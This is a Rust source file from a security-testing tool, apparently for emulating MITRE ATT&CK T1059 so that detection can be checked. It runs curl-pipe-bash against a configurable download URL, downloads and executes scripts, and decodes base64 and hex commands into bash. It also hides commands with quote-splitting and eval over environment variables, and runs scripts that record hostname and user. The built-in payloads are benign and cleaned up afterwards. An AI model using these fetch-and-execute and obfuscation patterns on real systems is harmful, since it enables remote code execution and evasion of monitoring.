// SIGNALBENCH - Command and Scripting Interpreter Techniques
// Command and Scripting Interpreter techniques (T1059)
// 
// This module implements advanced command and script execution techniques
// Developed by Simon Sigre (simon@gocortex.io)
// Part of the GoCortex.io platform for security testing and validation

use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, CleanupFuture, ExecuteFuture, SimulationResult, Technique, TechniqueParameter};
use async_trait::async_trait;
use base64::Engine;
use std::fs::File;
use std::io::Write;
use std::path::Path;
use tokio::process::Command;
use log::{debug, error, info};


// ======================================
// T1059 - Advanced Command and Scripting Interpreter
// ======================================
pub struct AdvancedCommandExecution {}

#[async_trait]
impl AttackTechnique for AdvancedCommandExecution {
    fn info(&self) -> Technique {
        Technique {
            id: "T1059".to_string(),
            name: "Advanced Command and Scripting Interpreter".to_string(),
            description: "Executes malicious commands with various obfuscation and evasion techniques".to_string(),
            category: "EXECUTION".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "payload_type".to_string(),
                    description: "Type of payload to execute (bash, python, perl, encoded)".to_string(),
                    required: false,
                    default: Some("bash".to_string()),
                },
                TechniqueParameter {
                    name: "download_url".to_string(),
                    description: "URL to download and execute payloads from".to_string(),
                    required: false,
                    default: Some("https://raw.githubusercontent.com/simonsigre/gocortex/refs/heads/main/test-script.sh".to_string()),
                },
                TechniqueParameter {
                    name: "output_dir".to_string(),
                    description: "Directory to save execution artifacts".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_cmd_exec".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save execution log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_cmd_log.txt".to_string()),
                },
                TechniqueParameter {
                    name: "use_obfuscation".to_string(),
                    description: "Whether to use command obfuscation techniques".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Process monitoring can detect suspicious command execution and script interpreters".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();
            
            // Get parameters from config or use defaults
            let payload_type = config
                .parameters
                .get("payload_type")
                .unwrap_or(&"bash".to_string())
                .clone()
                .to_lowercase();
                
            let download_url = config
                .parameters
                .get("download_url")
                .unwrap_or(&"https://raw.githubusercontent.com/simonsigre/gocortex/refs/heads/main/test-script.sh".to_string())
                .clone();
                
            let output_dir = config
                .parameters
                .get("output_dir")
                .unwrap_or(&"/tmp/signalbench_cmd_exec".to_string())
                .clone();
                
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_cmd_log.txt".to_string())
                .clone();
                
            let use_obfuscation = config
                .parameters
                .get("use_obfuscation")
                .unwrap_or(&"true".to_string())
                .clone()
                .to_lowercase() == "true";
            
            // Create artifact list to track files for cleanup
            let mut artifacts = vec![log_file.clone()];
            
            if dry_run {
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: format!("Would execute {payload_type} payload with download from {download_url}, obfuscation: {use_obfuscation}"),
                    artifacts,
                    cleanup_required: true,
                });
            }
            
            // Create output directory
            if !Path::new(&output_dir).exists() {
                std::fs::create_dir_all(&output_dir)
                    .map_err(|e| format!("Failed to create output directory: {e}"))?;
            }
            
            // Add output directory to artifacts for cleanup
            artifacts.push(output_dir.clone());
            
            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            // Write header
            writeln!(log_file_handle, "# SignalBench Advanced Command and Scripting Interpreter").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK Technique: T1059").unwrap();
            writeln!(log_file_handle, "# Payload Type: {payload_type}").unwrap();
            writeln!(log_file_handle, "# Download URL: {download_url}").unwrap();
            writeln!(log_file_handle, "# Output Directory: {output_dir}").unwrap();
            writeln!(log_file_handle, "# Use Obfuscation: {use_obfuscation}").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();
            
            // Different execution paths based on payload type
            match payload_type.as_str() {
                "bash" => {
                    writeln!(log_file_handle, "\n## Executing Bash Payload").unwrap();
                    
                    // Create a test script filename
                    let script_file = format!("{output_dir}/test_script.sh");
                    artifacts.push(script_file.clone());
                    
                    // 1. First approach: Direct download and execution
                    writeln!(log_file_handle, "\n1. Direct download and execution (curl | bash)").unwrap();
                    
                    let curl_pipe_bash_cmd = if use_obfuscation {
                        // Obfuscated version
                        format!("c\"u\"r\"l -s {download_url} | b\"a\"s\"h")
                    } else {
                        // Clear version
                        format!("curl -s {download_url} | bash")
                    };
                    
                    writeln!(log_file_handle, "Executing: {curl_pipe_bash_cmd}").unwrap();
                    
                    let curl_bash_output = Command::new("bash")
                        .arg("-c")
                        .arg(&curl_pipe_bash_cmd)
                        .output()
                        .await;
                        
                    match curl_bash_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            let stdout = String::from_utf8_lossy(&output.stdout);
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            
                            writeln!(log_file_handle, "Exit Code: {exit_code}").unwrap();
                            if !stdout.is_empty() {
                                writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                            }
                            if !stderr.is_empty() {
                                writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Execution Error: {e}").unwrap();
                        }
                    }
                    
                    // 2. Second approach: Download to file then execute
                    writeln!(log_file_handle, "\n2. Download to file then execute").unwrap();
                    
                    // Download script
                    let download_cmd = format!("curl -s -o {script_file} {download_url}");
                    writeln!(log_file_handle, "Downloading: {download_cmd}").unwrap();
                    
                    let download_output = Command::new("bash")
                        .arg("-c")
                        .arg(&download_cmd)
                        .output()
                        .await;
                        
                    match download_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            writeln!(log_file_handle, "Download Exit Code: {exit_code}").unwrap();
                            
                            if exit_code == 0 {
                                // Make executable
                                let chmod_cmd = format!("chmod +x {script_file}");
                                let _ = Command::new("bash")
                                    .arg("-c")
                                    .arg(&chmod_cmd)
                                    .output()
                                    .await;
                                
                                // Execute with bash directly
                                let exec_cmd = if use_obfuscation {
                                    // Obfuscated version - using variable expansion
                                    format!("SCRIPT_PATH={script_file}; b\"a\"s\"h \"$SCRIPT_PATH\"")
                                } else {
                                    // Clear version
                                    format!("bash {script_file}")
                                };
                                
                                writeln!(log_file_handle, "Executing: {exec_cmd}").unwrap();
                                
                                let exec_output = Command::new("bash")
                                    .arg("-c")
                                    .arg(&exec_cmd)
                                    .output()
                                    .await;
                                    
                                match exec_output {
                                    Ok(output) => {
                                        let exit_code = output.status.code().unwrap_or(-1);
                                        let stdout = String::from_utf8_lossy(&output.stdout);
                                        let stderr = String::from_utf8_lossy(&output.stderr);
                                        
                                        writeln!(log_file_handle, "Execution Exit Code: {exit_code}").unwrap();
                                        if !stdout.is_empty() {
                                            writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                                        }
                                        if !stderr.is_empty() {
                                            writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                                        }
                                    },
                                    Err(e) => {
                                        writeln!(log_file_handle, "Execution Error: {e}").unwrap();
                                    }
                                }
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Download Error: {e}").unwrap();
                        }
                    }
                    
                    // 3. Third approach: Base64 encoded execution
                    writeln!(log_file_handle, "\n3. Base64 encoded command execution").unwrap();
                    
                    // Simple test command
                    let test_command = "echo \"SignalBench Base64 Command Execution Test\" > /tmp/signalbench_test_b64_exec";
                    let base64_command = base64::engine::general_purpose::STANDARD.encode(test_command);
                    artifacts.push("/tmp/signalbench_test_b64_exec".to_string());
                    
                    let base64_exec_cmd = format!("echo {base64_command} | base64 -d | bash");
                    writeln!(log_file_handle, "Base64 Command: {base64_exec_cmd}").unwrap();
                    
                    let base64_output = Command::new("bash")
                        .arg("-c")
                        .arg(&base64_exec_cmd)
                        .output()
                        .await;
                        
                    match base64_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            let stdout = String::from_utf8_lossy(&output.stdout);
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            
                            writeln!(log_file_handle, "Base64 Execution Exit Code: {exit_code}").unwrap();
                            if !stdout.is_empty() {
                                writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                            }
                            if !stderr.is_empty() {
                                writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Base64 Execution Error: {e}").unwrap();
                        }
                    }
                },
                "python" => {
                    writeln!(log_file_handle, "\n## Executing Python Payload").unwrap();
                    
                    // Create a test Python script filename
                    let script_file = format!("{output_dir}/test_script.py");
                    artifacts.push(script_file.clone());
                    
                    // 1. First approach: Direct Python execution
                    writeln!(log_file_handle, "\n1. Direct Python code execution with exec()").unwrap();
                    
                    // Simple Python code that creates a file
                    let python_code = r#"
import os
import platform
import socket

# Create test file
with open('/tmp/signalbench_python_exec_test.txt', 'w') as f:
    f.write('SignalBench Python Execution Test\n')
    f.write(f'Hostname: {socket.gethostname()}\n')
    f.write(f'Platform: {platform.platform()}\n')
    f.write(f'Python: {platform.python_version()}\n')
    f.write(f'Current user: {os.getlogin()}\n')
"#;
                    
                    artifacts.push("/tmp/signalbench_python_exec_test.txt".to_string());
                    
                    let python_exec_cmd = if use_obfuscation {
                        // Obfuscated version using eval/exec
                        format!("python3 -c \"exec('{}')\"", python_code.replace("\n", "\\n").replace("'", "\\'"))
                    } else {
                        // Write to file and execute
                        format!("cat > {script_file} << 'EOF'\n{python_code}\nEOF\npython3 {script_file}")
                    };
                    
                    writeln!(log_file_handle, "Executing Python: {}", 
                             if python_exec_cmd.len() > 100 { 
                                 format!("{}... (truncated)", &python_exec_cmd[0..100]) 
                             } else { 
                                 python_exec_cmd.clone() 
                             }).unwrap();
                    
                    let python_output = Command::new("bash")
                        .arg("-c")
                        .arg(&python_exec_cmd)
                        .output()
                        .await;
                        
                    match python_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            let stdout = String::from_utf8_lossy(&output.stdout);
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            
                            writeln!(log_file_handle, "Python Execution Exit Code: {exit_code}").unwrap();
                            if !stdout.is_empty() {
                                writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                            }
                            if !stderr.is_empty() {
                                writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Python Execution Error: {e}").unwrap();
                        }
                    }
                    
                    // 2. Second approach: Download and execute Python script
                    writeln!(log_file_handle, "\n2. Download and execute Python script").unwrap();
                    
                    // Download script
                    let python_url = format!("{}/test-script.py", 
                                   download_url.rsplit('/').nth(1).unwrap_or("https://raw.githubusercontent.com/simonsigre/gocortex/refs/heads/main"));
                    let download_cmd = format!("curl -s -o {script_file} {python_url}");
                    writeln!(log_file_handle, "Downloading: {download_cmd}").unwrap();
                    
                    let download_output = Command::new("bash")
                        .arg("-c")
                        .arg(&download_cmd)
                        .output()
                        .await;
                        
                    match download_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            writeln!(log_file_handle, "Download Exit Code: {exit_code}").unwrap();
                            
                            if exit_code == 0 {
                                // Execute the Python script
                                let exec_cmd = if use_obfuscation {
                                    // Obfuscated - using python -m
                                    format!("cd {} && p\"y\"t\"h\"o\"n3 -m test_script", output_dir.rsplit('/').nth(0).unwrap_or("/tmp"))
                                } else {
                                    // Direct execution
                                    format!("python3 {script_file}")
                                };
                                
                                writeln!(log_file_handle, "Executing: {exec_cmd}").unwrap();
                                
                                let exec_output = Command::new("bash")
                                    .arg("-c")
                                    .arg(&exec_cmd)
                                    .output()
                                    .await;
                                    
                                match exec_output {
                                    Ok(output) => {
                                        let exit_code = output.status.code().unwrap_or(-1);
                                        let stdout = String::from_utf8_lossy(&output.stdout);
                                        let stderr = String::from_utf8_lossy(&output.stderr);
                                        
                                        writeln!(log_file_handle, "Python Script Execution Exit Code: {exit_code}").unwrap();
                                        if !stdout.is_empty() {
                                            writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                                        }
                                        if !stderr.is_empty() {
                                            writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                                        }
                                    },
                                    Err(e) => {
                                        writeln!(log_file_handle, "Python Script Execution Error: {e}").unwrap();
                                    }
                                }
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Download Error: {e}").unwrap();
                        }
                    }
                },
                "encoded" => {
                    writeln!(log_file_handle, "\n## Executing Encoded Commands").unwrap();
                    
                    // 1. Base64 encoded command
                    writeln!(log_file_handle, "\n1. Base64 encoded command").unwrap();
                    
                    // Create a simple command and encode it
                    let test_command = "echo \"SignalBench Base64 Command Execution Test\" > /tmp/signalbench_test_encoded_exec.txt";
                    let base64_command = base64::engine::general_purpose::STANDARD.encode(test_command);
                    artifacts.push("/tmp/signalbench_test_encoded_exec.txt".to_string());
                    
                    let base64_exec_cmd = format!("echo {base64_command} | base64 -d | bash");
                    writeln!(log_file_handle, "Base64 Command: {base64_exec_cmd}").unwrap();
                    
                    let base64_output = Command::new("bash")
                        .arg("-c")
                        .arg(&base64_exec_cmd)
                        .output()
                        .await;
                        
                    match base64_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            let stdout = String::from_utf8_lossy(&output.stdout);
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            
                            writeln!(log_file_handle, "Base64 Execution Exit Code: {exit_code}").unwrap();
                            if !stdout.is_empty() {
                                writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                            }
                            if !stderr.is_empty() {
                                writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Base64 Execution Error: {e}").unwrap();
                        }
                    }
                    
                    // 2. Hex encoded command
                    writeln!(log_file_handle, "\n2. Hex encoded command").unwrap();
                    
                    // Create a simple command and encode it
                    let test_command = "echo \"SignalBench Hex Command Execution Test\" > /tmp/signalbench_test_hex_exec.txt";
                    let hex_command = hex::encode(test_command);
                    artifacts.push("/tmp/signalbench_test_hex_exec.txt".to_string());
                    
                    let hex_exec_cmd = format!("echo {hex_command} | xxd -r -p | bash");
                    writeln!(log_file_handle, "Hex Command: {hex_exec_cmd}").unwrap();
                    
                    let hex_output = Command::new("bash")
                        .arg("-c")
                        .arg(&hex_exec_cmd)
                        .output()
                        .await;
                        
                    match hex_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            let stdout = String::from_utf8_lossy(&output.stdout);
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            
                            writeln!(log_file_handle, "Hex Execution Exit Code: {exit_code}").unwrap();
                            if !stdout.is_empty() {
                                writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                            }
                            if !stderr.is_empty() {
                                writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Hex Execution Error: {e}").unwrap();
                        }
                    }
                    
                    // 3. Using environment variables to hide command
                    writeln!(log_file_handle, "\n3. Environment variable command obfuscation").unwrap();
                    
                    let env_exec_cmd = r#"
CMD_PART1="ec"
CMD_PART2="ho"
CMD_PART3=" Snel"
CMD_PART4="len En"
CMD_PART5="v Command"
CMD_PART6=" Test > /tmp/signalbench_test_env_exec.txt"
eval "${CMD_PART1}${CMD_PART2}${CMD_PART3}${CMD_PART4}${CMD_PART5}${CMD_PART6}"
"#;
                    artifacts.push("/tmp/signalbench_test_env_exec.txt".to_string());
                    
                    writeln!(log_file_handle, "Env Var Command: {}", env_exec_cmd.replace("\n", " ")).unwrap();
                    
                    let env_output = Command::new("bash")
                        .arg("-c")
                        .arg(env_exec_cmd)
                        .output()
                        .await;
                        
                    match env_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            let stdout = String::from_utf8_lossy(&output.stdout);
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            
                            writeln!(log_file_handle, "Env Var Execution Exit Code: {exit_code}").unwrap();
                            if !stdout.is_empty() {
                                writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                            }
                            if !stderr.is_empty() {
                                writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Env Var Execution Error: {e}").unwrap();
                        }
                    }
                },
                "perl" => {
                    writeln!(log_file_handle, "\n## Executing Perl Payload").unwrap();
                    
                    // Create a test Perl script filename
                    let script_file = format!("{output_dir}/test_script.pl");
                    artifacts.push(script_file.clone());
                    
                    // Create a simple Perl script
                    let perl_code = r#"
#!/usr/bin/perl
use strict;
use warnings;

# Create a test file
open(my $fh, '>', '/tmp/signalbench_perl_exec_test.txt') or die "Cannot open file: $!";
print $fh "SignalBench Perl Execution Test\n";
print $fh "Current time: " . localtime() . "\n";
print $fh "Hostname: " . `hostname` . "\n";
print $fh "Current user: " . `whoami` . "\n";
close $fh;

# Print confirmation
print "Perl script executed successfully\n";
"#;
                    
                    artifacts.push("/tmp/signalbench_perl_exec_test.txt".to_string());
                    
                    // Write Perl script to file
                    if let Err(e) = std::fs::write(&script_file, perl_code) {
                        writeln!(log_file_handle, "Failed to write Perl script: {e}").unwrap();
                    } else {
                        // Make executable
                        let chmod_cmd = format!("chmod +x {script_file}");
                        let _ = Command::new("bash")
                            .arg("-c")
                            .arg(&chmod_cmd)
                            .output()
                            .await;
                            
                        // Execute Perl script
                        let exec_cmd = if use_obfuscation {
                            // Obfuscated - using perl -e
                            format!("p\"e\"r\"l -e 'do \"{script_file}\"'")
                        } else {
                            // Direct execution
                            format!("perl {script_file}")
                        };
                        
                        writeln!(log_file_handle, "Executing Perl: {exec_cmd}").unwrap();
                        
                        let perl_output = Command::new("bash")
                            .arg("-c")
                            .arg(&exec_cmd)
                            .output()
                            .await;
                            
                        match perl_output {
                            Ok(output) => {
                                let exit_code = output.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&output.stdout);
                                let stderr = String::from_utf8_lossy(&output.stderr);
                                
                                writeln!(log_file_handle, "Perl Execution Exit Code: {exit_code}").unwrap();
                                if !stdout.is_empty() {
                                    writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                                }
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                                }
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "Perl Execution Error: {e}").unwrap();
                            }
                        }
                    }
                    
                    // Also try perl one-liner for direct command execution
                    writeln!(log_file_handle, "\nPerl One-Liner Execution").unwrap();
                    
                    let perl_oneliner = r#"perl -e 'system("echo \"SignalBench Perl One-Liner Test\" > /tmp/signalbench_perl_oneliner.txt");'"#;
                    artifacts.push("/tmp/signalbench_perl_oneliner.txt".to_string());
                    
                    writeln!(log_file_handle, "Executing: {perl_oneliner}").unwrap();
                    
                    let oneliner_output = Command::new("bash")
                        .arg("-c")
                        .arg(perl_oneliner)
                        .output()
                        .await;
                        
                    match oneliner_output {
                        Ok(output) => {
                            let exit_code = output.status.code().unwrap_or(-1);
                            let stdout = String::from_utf8_lossy(&output.stdout);
                            let stderr = String::from_utf8_lossy(&output.stderr);
                            
                            writeln!(log_file_handle, "Perl One-Liner Exit Code: {exit_code}").unwrap();
                            if !stdout.is_empty() {
                                writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
                            }
                            if !stderr.is_empty() {
                                writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                            }
                        },
                        Err(e) => {
                            writeln!(log_file_handle, "Perl One-Liner Error: {e}").unwrap();
                        }
                    }
                },
                _ => {
                    writeln!(log_file_handle, "\n## ERROR: Unsupported payload type '{payload_type}'").unwrap();
                    writeln!(log_file_handle, "Supported types: bash, python, perl, encoded").unwrap();
                }
            }
            
            // Close log file
            drop(log_file_handle);
            
            info!("Command and scripting interpreter test complete, logs saved to {log_file}");
            
            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: format!("Command and scripting interpreter ({payload_type}) test completed. Logs: {log_file}"),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    // If it's a directory, try to remove it recursively
                    if Path::new(artifact).is_dir() {
                        if let Err(e) = std::fs::remove_dir_all(artifact) {
                            error!("Failed to remove directory {artifact}: {e}");
                        } else {
                            debug!("Removed directory: {artifact}");
                        }
                    } else {
                        // Otherwise try to remove as a file
                        if let Err(e) = std::fs::remove_file(artifact) {
                            error!("Failed to remove artifact {artifact}: {e}");
                        } else {
                            debug!("Removed artifact: {artifact}");
                        }
                    }
                }
            }
            Ok(())
        })
    }
}